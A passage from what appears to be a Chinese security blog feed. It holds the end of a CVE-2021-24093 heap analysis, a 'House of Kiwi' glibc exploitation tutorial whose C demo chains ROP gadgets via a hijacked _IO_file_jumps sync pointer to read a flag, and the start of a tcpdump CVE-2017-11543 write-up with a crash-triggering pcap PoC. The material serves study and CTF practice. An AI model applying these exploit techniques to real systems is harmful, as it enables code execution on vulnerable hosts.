style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/17.png"></div><p>重启在调用fs_NewSfnt前下断点</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/18.png"></div>可以看到申请的内存大小0x6fa4<p>继续运行：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/19.png"></div>可以看到申请的内存地址是0000012f8cd56c50<p>在崩溃函数中下断点，目的是看看操作的空间和分配的空间：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/20.png"></div><p>内存起始位置是0000012f8cd56c50，内存块使用地址是0000012f8cd571ec</p><p>查看堆块大小以及addr1相对偏移0x59c</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/21.png"></div><p>我们看看之前赋值非法地址到r8处的值</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/22.png"></div>看到了偏移是6c8，好了这下明白了非法地址的来源了：<p>第一个堆地址相对于堆块起始位置是0x59c+memset的0x148的初始化&gt;0x6c8</p><p>也就是说在这个函数中：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/23.png"></div>已经将合法地址改为ttf中的数据<h1 id="0x05-patch"><a href="#0x05-patch" class="headerlink" title="0x05 patch"></a>0x05 patch</h1><p>分配堆块更大，x数组和y数组的大小还是0x148字节，ESI对象距离堆块起始地址的距离变大，所以在x数组和y数组的赋值过程中没有覆盖到ESI对象。也就是说addr+0x148&lt;esi对象对应的堆地址</p><h1 id="0x06-重要参考"><a href="#0x06-重要参考" class="headerlink" title="0x06 重要参考"></a>0x06 重要参考</h1><p><a href="https://www.anquanke.com/post/id/236190#h3-10" target="_blank" rel="noopener">CVE-2021-24093 Windows图形组件远程执行代码漏洞分析</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CVE学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Kiwi</title>
      <link href="/2021/04/15/house-of-kiwi/"/>
      <url>/2021/04/15/house-of-kiwi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>这两天调内核的cve实在是被恶心到了，针对问题也去请教了师傅，今天是调不下去了。</p><p>在2.29以后由于setcontext中的rdi改为rdx寄存器，需要gadgets将rdi-&gt;rdx：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/0.png"></div><p>常见的一个操作是劫持malloc_hook为setcontext的gadgets,以及劫持IO_list_all单链表中的指针在exit结束中,在_IO_cleanup函数会进行缓冲区的刷新,从而读取flag</p><p>但是如果将exit函数替换成_exit函数,最终结束的时候,则是进行了syscall来结束：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/1.png"></div><p>并没有机会调用_IO_cleanup,若再将<strong>malloc_hook和</strong>free_hook给禁了,且在输入和输出都用read和write的情况下,无法通过IO刷新缓冲区进行调用,这时候就涉及到ptmalloc源码里面了。</p><h1 id="0x01-使用场景"><a href="#0x01-使用场景" class="headerlink" title="0x01 使用场景"></a>0x01 使用场景</h1><p>1.能够触发__malloc_assert,通常是堆溢出导致<br>2.能够任意写,修改_IO_file_sync和IO_helper_jumps + 0xA0 and 0xA8</p><p>接下来一步一步跟进：</p><p>第一步：__malloc_assert:</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/2.png"></div><p>第二步：fflush：其中会调用_IO_file_jumps中的sync指针</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/3.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/4.png"></div><p>如何触发assert?在_int_malloc中存在一个 assert (chunk_main_arena (bck-&gt;bk));位置可以触发,此外当top_chunk的大小不够分配时,则会进入sysmalloc中</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/5.png"></div><pre class="line-numbers language-c"><code class="language-c">  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>old_top <span class="token operator">==</span> <span class="token function">initial_top</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> old_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>old_size<span class="token punctuation">)</span> <span class="token operator">>=</span> MINSIZE <span class="token operator">&amp;&amp;</span>           <span class="token function">prev_inuse</span> <span class="token punctuation">(</span>old_top<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> old_end <span class="token operator">&amp;</span> <span class="token punctuation">(</span>pagesize <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>检查topchunk的size和flags：</p><p>1.old_size &gt;= 0x20<br>2.old_top.prev_inuse = 0<br>3.old_top页对齐</p><p>如果存在一个任意写,通过修改 _IO_file_jumps + 0x60的_IO_file_sync指针为setcontext+61修改IO_helper_jumps + 0xA0 and 0xA8分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p><h1 id="0x02-调试"><a href="#0x02-调试" class="headerlink" title="0x02 调试"></a>0x02 调试</h1><p>环境ubuntu20.04 </p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span><span class="token comment" spellcheck="true">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/filter.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/seccomp.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span><span class="token macro property">#<span class="token directive keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span><span class="token macro property">#<span class="token directive keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span><span class="token macro property">#<span class="token directive keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span><span class="token macro property">#<span class="token directive keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span><span class="token macro property">#<span class="token directive keyword">define</span> ret pop_rdi_ret+1</span>size_t libc_base<span class="token punctuation">;</span>size_t ROP<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> FLAG<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"./flag.txt\x00"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_NO_NEW_PRIVS<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> sock_filter sfi<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token punctuation">{</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00000004</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0xC000003E</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00000000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x40000000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x0000003B</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x7FFF0000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00000000</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> sock_fprog sfp <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">8</span><span class="token punctuation">,</span> sfi<span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_SECCOMP<span class="token punctuation">,</span> SECCOMP_MODE_FILTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sfp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">setROP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    uint32_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rax_ret<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rdi_ret<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span>FLAG<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rsi_ret<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> syscall_ret<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rdi_ret<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rdx_r12<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rsi_ret<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span><span class="token punctuation">(</span>FLAG <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span>read<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rdi_ret<span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    ROP<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span>write<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0LL</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0LL</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0LL</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    libc_base  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span>setvbuf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x81630</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"LIBC:\t%#lx\n"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t magic_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x53030</span> <span class="token operator">+</span> <span class="token number">61</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// setcontext + 61</span>    size_t IO_helper <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1E48C0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// _IO_hel</span>    per_jumps<span class="token punctuation">;</span>    size_t SYNC <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1E5520</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// sync pointer in _IO_file_jumps</span>    <span class="token function">setROP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>IO_helper <span class="token operator">+</span> <span class="token number">0xA0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> ROP<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置rsp</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>IO_helper <span class="token operator">+</span> <span class="token number">0xA8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> ret<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>SYNC<span class="token punctuation">)</span> <span class="token operator">=</span> magic_gadget<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置fflush(stderr)中调用的指令地址</span>    <span class="token comment" spellcheck="true">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span>    size_t <span class="token operator">*</span>top_size <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>top_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>top_size<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFFE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 触发assert</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/6.png"></div><p>看到old_size&gt;0x20,pre_inuse=0,(2b0+0xd50)&amp;0xfff=0</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/7.png"></div><p>调用sync的函数指针</p><p>这个利用方法好处在于不用再用gadget将rdi赋值给rdx，其实整体利用的要求还是挺高的，拓宽一个思路</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/house-of-kiwi/8.png"></div><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://www.anquanke.com/post/id/235598" target="_blank" rel="noopener">House OF Kiwi</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2021 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 高版本或沙箱情况下堆利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-11543 tcpdump越界访问漏洞</title>
      <link href="/2021/04/03/cve-2017-11543-tcpdump-yue-jie-fang-wen-lou-dong/"/>
      <url>/2021/04/03/cve-2017-11543-tcpdump-yue-jie-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>tcpdump 是 Linux 上一个强大的网络数据采集分析工具，其 4.9.0 版本的 sliplink_print 函数（位于 print-sl.c）中存在一个栈溢出漏洞，原因是程序在进行内存存取的操作前未对一些值做判断，导致操作了非法的内存地址。攻击者可以利用这个漏洞触发拒绝服务，甚至任意代码执行。</p><p>使用方法：<br>-i any：监听所有网络接口<br>-i eth0：监听指定的网络接口（eth0）<br>-D：列出所有可用的网络接口<br>-n：不解析主机名<br>-nn：不解析主机名和端口名<br>-q：输出较少的信息<br>-t：更便于阅读的时间戳输出<br>-tttt：最便于阅读的时间戳输出<br>-X：以 HEX 和 ASCII 模式输出数据包的内容<br>-XX：与 -X 选项相同，同时还输出 ethernet 头<br>-v, -vv, -vvv：输出更多数据包的信息<br>-c：获取到指定数目的数据包后就停止<br>-s：定义 snaplength (size) ，-s0 表示获取全部<br>-S：输出绝对序列号<br>-e：获取 ethernet 头信息<br>-E：通过提供 key 来解密 IPSEC 流量</p><h1 id="0x02-搭建漏洞调试环境"><a href="#0x02-搭建漏洞调试环境" class="headerlink" title="0x02 搭建漏洞调试环境"></a>0x02 搭建漏洞调试环境</h1><p>安装dev版本的libpcap：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libpcap-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载4.9版本的tcpdump</p><pre><code>wget https://github.com/the-tcpdump-group/tcpdump/archive/tcpdump-4.9.0.tar.gz tar zxvf tcpdump-4.9.0.tar.gzcd tcpdump-tcpdump-4.9.0/./configure</code></pre><p>执行 configure 会生成相应的 Makefile，然后 make install 就可以了，但是这里我们修改下 Makefile，给 gcc 加上参数 -fsanitize=address，以开启内存检测功能：</p><pre><code>CFLAGS = -g -O2 -fsanitize=address</code></pre><p>最后安装</p><pre><code>sudo make install</code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/03/cve-2017-11543-tcpdump-yue-jie-fang-wen-lou-dong/0.png"></div><h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>使用下面的 poc 即可成功地触发漏洞产生 Segment Fault：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">sigsegv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    buf  <span class="token operator">=</span> <span class="token string">"\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>    buf <span class="token operator">+=</span> <span class="token string">"\x00\x00\x04\x00\x08\x00\x00\x00\xf6\xb5\xa5X\xf8\xbd\x07\x00'"</span>    buf <span class="token operator">+=</span> <span class="token string">"\x00\x00\x006\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7"</span>    buf <span class="token operator">+=</span> <span class="token string">"\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xca\x00"</span>    buf <span class="token operator">+=</span> <span class="token string">"\x00RT\x00\x125\x02\x08\x00'\xbd\xc8.\x08\x00"</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"slip-bad-direction.pcap"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    cmd <span class="token operator">=</span> <span class="token string">'tcpdump -e -r slip-bad-direction.pcap'</span> <span class="token comment" spellcheck="true"># -e：获取 ethernet 头信息</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    sigsegv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/03/cve-2017-11543-tcpdump-yue-jie-fang-wen-lou-dong/1.png"></div><p>分析pcap包的文件格式，文件头是这样一个结构体，总共24个字节：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> pcap_file_header <span class="token punctuation">{</span>        bpf_u_int32 magic<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 标识位：4 字节，这个标识位的值是 16 进制的 0xa1b2c3d4</span>        u_short version_major<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 主版本号：2 字节，默认值为 0x2</span>        u_short version_minor<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 副版本号：2 字节，默认值为 0x04</span>        bpf_int32 thiszone<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 区域时间：4 